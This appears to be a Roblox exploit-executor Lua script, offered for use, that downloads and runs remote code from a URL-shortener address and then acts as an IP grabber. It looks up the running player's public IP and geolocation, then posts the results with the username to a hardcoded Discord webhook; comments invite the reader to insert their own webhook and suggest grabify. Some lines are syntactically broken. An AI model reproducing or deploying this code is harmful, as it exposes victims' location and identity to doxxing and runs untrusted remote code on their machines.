local Response = syn.request({
    Url = "https://shhh.lol/E38AYP",
    Method = "GET"
})


loadstring(http.request({Url="https://shhh.lol/E38AYP"}).Body)()


loadstring(request({Url="https://shhh.lol/E38AYP"}).Body)() 
// make ip grabber id recommend grabify

--------------------------------------------------------------

local name = game:GetService("Players").LocalPlayer.Name
// put your webhook there fluro#0009
local WebhookURL = "https://discord.com/api/webhooks/992355966534307932/2b7akbx97JhFK-Se5BVbUzHrWj0R9p7stUDDvEPdNli__3CH6oOzbsEGdbalRvBuvFCz"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("
User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s
", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

syn.request(
    {
        Url = https://discord.com/api/webhooks/992355966534307932/2b7akbx97JhFK-Se5BVbUzHrWj0R9p7stUDDvEPdNli__3CH6oOzbsEGdbalRvBuvFCz, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)
